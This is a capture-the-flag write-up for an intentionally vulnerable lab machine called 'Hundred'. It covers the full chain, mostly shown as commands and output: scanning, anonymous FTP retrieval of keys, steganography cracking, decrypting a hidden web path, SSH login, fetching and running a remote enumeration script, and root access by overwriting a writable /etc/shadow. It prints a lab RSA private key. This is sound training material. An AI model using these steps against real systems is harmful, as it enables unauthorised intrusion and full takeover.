@@ -1,0 +1,407 @@
+---------- Hundered Writeup ----------
+
+--> arp-scan 
+  ──(root㉿kali)-[*]
+  └─# arp-scan -l | grep "PCS"
+  10.0.2.3	08:00:27:7e:46:b5	PCS Systemtechnik GmbH
+  10.0.2.36	08:00:27:91:07:7d	PCS Systemtechnik GmbH
+
+    -- We found the machine with arp-scan. (10.0.2.36)
+
+
+-->  nmap 
+  ──(root㉿kali)-[*]
+  └─# nmap -sV -sC -p- -A 10.0.2.36 
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 11:20 EDT
+  Nmap scan report for 10.0.2.36
+  Host is up (0.0010s latency).
+  Not shown: 65532 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  21/tcp open  ftp     vsftpd 3.0.3
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  | -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]
+  | -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]
+  | -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]
+  |_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to ::ffff:10.0.2.24
+  |      Logged in as ftp
+  |      TYPE: ASCII
+  |      No session bandwidth limit
+  |      Session timeout in seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      At session startup, client count was 1
+  |       vsFTPd 3.0.3 - secure, fast, stable
+  |_End of status
+  22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)
+  |   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)
+  |_  256 06:80:3b:fc:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)
+  80/tcp open  http    nginx 1.14.2
+  |_http-server-header: nginx/1.14.2
+  |_http-title: Site doesn't have a title (text/html).
+  MAC Address: 08:00:27:91:07:7D (Oracle VirtualBox virtual NIC)
+  Device type: general purpose
+  Running: Linux 4.X|5.X
+  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+  OS details: Linux 4.15 - 5.8
+  Network Distance: 1 hop
+  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+  TRACEROUTE
+  HOP RTT     ADDRESS
+  1   1.04 ms 10.0.2.36
+
+  OS and Service detection performed. Please report any incorrect results at     https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 37.18 seconds
+
+    -- 21/tcp open and 80/tcp open ports are open. 
+    -- And we can login ftp port as anonymous.
+
+
+--> ftp 
+  ──(root㉿kali)-[*]
+  └─# ftp Anonymous@10.0.2.36
+  Connected to 10.0.2.36.
+  220 (vsFTPd 3.0.3)
+  331 Please specify the password.
+  Password: 
+  230 Login successful.
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+ftp> ls -al 
+  229 Entering Extended Passive Mode (|||41668|)
+  150 Here comes the directory listing.
+  drwxr-xr-x    2 0        113          4096 Aug 02  2021 .
+  drwxr-xr-x    2 0        113          4096 Aug 02  2021 ..
+  -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa
+  -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem
+  -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub
+  -rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt
+  226 Directory send OK.
+ftp> mget * 
+  mget id_rsa [anpqy?]? y
+  229 Entering Extended Passive Mode (|||61817|)
+  150 Opening BINARY mode data connection for id_rsa (435 bytes).
+100% |**********************************************************************************|     435      879.51 KiB/s    00:00 ETA
+  226 Transfer complete.
+  435 bytes received in 00:00 (203.06 KiB/s)
+  mget id_rsa.pem [anpqy?]? y
+  229 Entering Extended Passive Mode (|||22646|)
+  150 Opening BINARY mode data connection for id_rsa.pem (1679 bytes).
+100% |**********************************************************************************|    1679        1.13 MiB/s    00:00 ETA
+  226 Transfer complete.
+  1679 bytes received in 00:00 (577.13 KiB/s)
+  mget id_rsa.pub [anpqy?]? y
+  229 Entering Extended Passive Mode (|||61275|)
+  150 Opening BINARY mode data connection for id_rsa.pub (451 bytes).
+100% |**********************************************************************************|     451      331.89 KiB/s    00:00 ETA
+  226 Transfer complete.
+  451 bytes received in 00:00 (183.74 KiB/s)
+  mget users.txt [anpqy?]? y
+  229 Entering Extended Passive Mode (|||13643|)
+  150 Opening BINARY mode data connection for users.txt (187 bytes).
+100% |**********************************************************************************|     187      131.56 KiB/s    00:00 ETA
+  226 Transfer complete.
+  187 bytes received in 00:00 (77.97 KiB/s)
+ftp> exit 
+  221 Goodbye.
+
+    -- We get 3 files (id_rsa | id_rsa.pem | id_rsa.pub | users.txt)
+
+
+--> curl 
+  ──(root㉿kali)-[*]
+  └─# curl http://10.0.2.36
+  <style>
+  .center {
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+    key: h4ckb1tu5.enc;
+    width: 50%;
+  }
+  </style>
+
+  <img src="logo.jpg" class="center"> 
+  <h1>Thank you ALL!</h1>
+  <h1>100 f*cking VMs!!</h1>
+
+  <!-- l4nr3n, nice dir.-->
+
+    -- Now let^s download the files for further inspection. 
+
+
+--> wget 
+  ─(root㉿kali)-[*]
+  └─# wget http://10.0.2.36/logo.jpg                          
+  --2024-05-11 11:24:32--  http://10.0.2.36/logo.jpg
+  Connecting to 10.0.2.36:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 7277 (7.1K) [image/jpeg]
+  Saving to: ‘logo.jpg’
+
+  logo.jpg                          100%[======================================================>]   7.11K  --.-KB/s    in 0s      
+
+  2024-05-11 11:24:32 (25.6 MB/s) - ‘logo.jpg’ saved [7277/7277]
+
+
+   ──(root㉿kali)-[*]
+  └─# wget http://10.0.2.36/h4ckb1tu5.enc
+  --2024-05-11 11:24:53--  http://10.0.2.36/h4ckb1tu5.enc
+  Connecting to 10.0.2.36:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 256 [application/octet-stream]
+  Saving to: ‘h4ckb1tu5.enc’
+
+  h4ckb1tu5.enc                     100%[======================================================>]     256  --.-KB/s    in 0s      
+
+  2024-05-11 11:24:53 (64.3 MB/s) - ‘h4ckb1tu5.enc’ saved [256/256]
+
+
+--> Lets look the files we get !!
+    ──(root㉿kali)-[*]
+  └─# cat users.txt        
+  --- SNIP ---
+  noname
+  roelvb
+  ch4rm
+  marcioapm
+  isen
+  sys7em
+  chicko
+  tasiyanci
+  luken
+  alienum
+  linked
+  tatayoyo
+  0xr0n1n
+  exploiter
+  kanek180
+  cromiphi
+  softyhack
+  b4el7d
+  val1d
+  --- SNIP ---
+
+  Thanks!
+  hmv
+                                                                                                                               
+  ──(root㉿kali)-[*]
+  └─# cat id_rsa   
+      / \
+      / _ \
+     | / \ |
+     ||   || _______
+     ||   || |\     \
+     ||   || ||\     \
+     ||   || || \    |
+     ||   || ||  \__/
+     ||   || ||   ||
+      \\_/ \_/ \_//
+     /   _     _   \
+    /               \
+    |    O     O    |
+    |   \  ___  /   |                           
+   /     \ \_/ /     \
+  /  -----  |  --\    \
+  |     \__/|\__/ \   |
+  \       |_|_|       /
+   \_____       _____/
+         \     /
+         |     |
+  -------------------------
+                                                                                                                               
+  ──(root㉿kali)-[*]
+  └─# cat id_rsa.pem 
+  -----BEGIN RSA PRIVATE KEY-----
+  MIIEpAIBAAKCAQEAwsrHORyA+mG6HS9ZmZwzPmKHrHhA0/kKCwNjUG8rmPVupv73
+  mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z2RnXDD1fh6mKlTJmcNwWCnA1PgD+
+  OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4QISU4ksriN16cOm/89jHadetB8dCe
+  h3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/NtwtndUkzzxKxuKC6z4gG780tZHhg83
+  xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9VzffnP6DAVnbReDDbhNLcnfVXEkBv8SQ
+  L7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMictQQIDAQABAoIBAE4Q6IDp/ILcEbPK
+  mzUl1Z+l60visdCCGVVKmU3OEAHwMtV4j5B++6fwBM2Dpig5MDBNJKmA+Zq9rsmE
+  vNJQemwCoB3Gpvd+qgybM1T9z1OFnsDnsvvEiNX1beEWKO2RWNx8RnhoQWovK81H
+  FCETT3GJMkAaUUjxgNkmspGUb0IcP4YR61jpNy8thMLz8FQV8XqNSf4DSd9+8wrm
+  FBFDFzso6zcBtsY6/nDueaVfLsequU1Fdhh3itC6rPXync/EWN0HJtaiKEVAytYE
+  cvl1hVpRVhGZGjPqNQSPcknO0K2b22anRoiSpBoCzaopbSZHySFgcZM8oxGgw35j
+  YpS1ULUCgYEA+1Se5s4AzsOX/3RRwwF9Was//oHU1N2JnJRetF9tjeFu8MEMnSec
+  a3bcPy+CZHB8oVnoyh647IObzPUjCgMxdyTLdfGmQ8RgzXhwYeQRe+ethrT/Ra26
+  7m+R+3838k5ZTKnwjBPreV/i2AmwZYDPT2S5q5b7m5Cr4QTfsaScaKsCgYEAxmk/
+  xzu2XO8YmE+8R62nWdLPMaj4E5IPkT3uCA8G24KGSSyK29OGZ02RI8qxWkdqMxKJ
+  rTDrQJ/4oU6108Vhay0tyFswbNn0ymlHAhPKxXNr0xHkC6rCnDEnn6W7bspTxxyk
+  9OUtl2UemtnEKRm3qu9Rc1qLFW0/Zhxw3ovgWcMCgYEAka6HPPoD9dXicSyXiBWA
+  900QlxHisFCJx70o+ByogClACUWdbirbvF71Y5rCVj3twAlBqocMYewXj0I4wUEA
+  lzM4zHD6EyXthqxdWCC/EbdFGmQn49fEFxmM4N7pKwbHNGz9BfU19PDjqJ5VJUD4
+  6ehUx2WJCq9dMd2FXI8yKmkCgYAMBBnBtiMQM8a4irOrX5/v961mo4YKoWDh+e8t
+  e8N9jcUWL2VldMUCApeUpFTjU8nht/CwlXLZ4hZLppmqbpy8weqw5JzlKroBfCi5
+  vnscRCY2jTHTZw8MKInuyDm2tvgl6d0vm6WMMqqM1D1mA9G0v3OeWdBshsY9J+HK
+  CIyYwwKBgQDEXoZ+lZKyPUBSgcE+b52U2Dj9GAPKPUDZpsCbUebftZknOk/HelF1
+  wiWWDjni1ILVSfWIR4/nvosJPa+39WDv+dFt3bJdcUA3SL2acW3MGVPC6abZWwSo
+  izXrZm8h0ZSuXyU/uuT3BCJt77HyN2cPZrqccPwanS9du6zrX0u2yQ==
+  -----END RSA PRIVATE KEY-----
+
+    -- we downloaded a jpeg file from the website before lets take a look at it. 
+
+
+--> stegseek 
+    ─(root㉿kali)-[*]
+  └─# stegseek logo.jpg users.txt -xf output 
+  StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+  [i] Found passphrase: "cromiphi"
+  [i] Original filename: "toyou.txt".
+  [i] Extracting to "output".
+
+                                                               
+  ──(root㉿kali)-[*]
+  └─# cat output     
+  d4t4s3c#1
+
+
+--> openssl
+    ─(root㉿kali)-[*]
+  └─# openssl pkeyutl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc -out keysign
+
+    ─(root㉿kali)-[*]
+  └─# cat keysign
+  /softyhackb4el7dshelldredd
+
+
+--> gobuster 
+  ─(root㉿kali)-[*]
+  └─# gobuster dir -u http://10.0.2.36/softyhackb4el7dshelldredd -w /home/s3r4ph/Tools    /SecLists/Discovery/Web-Content/common.txt 
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.0.2.36/softyhackb4el7dshelldredd
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /home/s3r4ph/Tools/SecLists/Discovery/Web-Content/common.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /id_rsa               (Status: 200) [Size: 1876]
+  /index.html           (Status: 200) [Size: 26]
+  Progress: 4727 / 4727 (100.00%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+    -- When we start gobuster scan we found id_rsa itselt 
+    -- Then we can get the id_and overwrite the id_rsa file that we found earlier in ftp.
+    
+      ─(root㉿kali)-[*]
+      └─# wget http://10.0.2.36/softyhackb4el7dshelldredd/id_rsa -O id_rsa 
+      --2024-05-11 11:28:22--  http://10.0.2.36/softyhackb4el7dshelldredd/id_rsa
+      Connecting to 10.0.2.36:80... connected.
+      HTTP request sent, awaiting response... 200 OK
+      Length: 1876 (1.8K) [application/octet-stream]
+      Saving to: ‘id_rsa’
+
+      id_rsa                              100%[======================================================>]   1.83K  --.-KB/s    in 0.001s  
+
+    2024-05-11 11:28:22 (2.73 MB/s) - ‘id_rsa’ saved [1876/1876]
+
+    -- You can check the id_rsa file by using cat command. 
+    -- After that we modified the perrmision of the id_rsa file by simply typing:
+      chmod 600 id_rsa
+
+
+--> ssh login and privilege escalation
+  ──(root㉿kali)-[*]
+  └─# ssh hmv@10.0.2.36 -i id_rsa
+  The authenticity of host '10.0.2.36 (10.0.2.36)' can't be established.
+  ED25519 key fingerprint is SHA256:CiCK/UJWUULl80syMwfpY3+G25hq7fX/xTkHA61y2Ws.
+  This host key is known by the following other names/addresses:
+      ~/.ssh/known_hosts:11: [hashed name]
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.0.2.36' (ED25519) to the list of known hosts.
+  Enter passphrase for key 'id_rsa': 
+  Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+  The programs included with the Debian GNU/Linux system are free software;
+  the exact distribution terms for each program are described in the
+  individual files in /usr/share/doc/*/copyright.
+
+  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+  permitted by applicable law.
+  Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
+hmv@hundred:~$ whoami;id;hostname
+  hmv
+  uid=1000(hmv) gid=1000(hmv)   groups=1000(hmv),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+  hundred
+hmv@hundred:~$ sudo -l 
+  -bash: sudo: command not found
+hmv@hundred:~$ find / -perm -u=s 2>/dev/null
+  /usr/bin/mount
+  /usr/bin/umount
+  /usr/bin/chfn
+  /usr/bin/chsh
+  /usr/bin/newgrp
+  /usr/bin/su
+  /usr/bin/gpasswd
+  /usr/bin/passwd
+  /usr/lib/eject/dmcrypt-get-device
+  /usr/lib/openssh/ssh-keysign
+  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+hmv@hundred:~$ ls -al 
+  total 40
+  drwxr-xr-x 4 hmv  hmv  4096 Aug  2  2021 .
+  drwxr-xr-x 3 root root 4096 Aug  2  2021 ..
+  -rw------- 1 hmv  hmv    23 Aug  2  2021 .bash_history
+  -rw-r--r-- 1 hmv  hmv   220 Aug  2  2021 .bash_logout
+  -rw-r--r-- 1 hmv  hmv  3526 Aug  2  2021 .bashrc
+  drwxr-xr-x 3 hmv  hmv  4096 Aug  2  2021 .local
+  -rw-r--r-- 1 hmv  hmv   807 Aug  2  2021 .profile
+  drwx------ 2 hmv  hmv  4096 Aug  2  2021 .ssh
+  -rw------- 1 hmv  hmv    12 Aug  2  2021 user.txt
+  -rw------- 1 hmv  hmv    53 Aug  2  2021 .Xauthority
+hmv@hundred:~$ cat user.txt
+  ************ --> Here is your user flag congrats !!!
+
+    -- After that we can use linpeas.sh for further enumeration and reaserch about the 
+      machine.
+    -- This time I dedided to use something new, this tool is inspired from Linenum and 
+      Unlike LinEnum, lse tries to gradualy expose the information depending on its             importance from a privesc point of view. Dont ' forget to check the further info          about the tool.
+
+hmv@hundred:~$ wget "https://github.com/diego-treitos/linux-smart-enumeration/releases  
+  /latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
+hmv@hundred:~$ ./lse.sh -l1 
+
+  [*] fst150 Looking for GIT/SVN repositories................................ nope
+  [!] fst160 Can we write to critical files?................................. yes!
+  ---
+-rwxrwx-wx 1 root shadow 963 Aug  2  2021 /etc/shadow
+  ---
+  [!] fst170 Can we write to critical directories?........................... nope
+  [!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+
+  hmv@hundred:~$ openssl passwd easy 
+    mF.UFPk8OMRNc
+hmv@hundred:~$ echo root:mF.UFPk8OMRNc:18844:0:99999:7::: > /etc/shadow 
+hmv@hundred:~$ su root 
+  Password: 
+root@hundred:/home/hmv# cd /root 
+root@hundred:~# ls 
+  root.txt
+root@hundred:~# cat root.txt
+  ************** --> Here is your root flag congrats !!!
+  
+  
+
+
+
+  
+
+
+
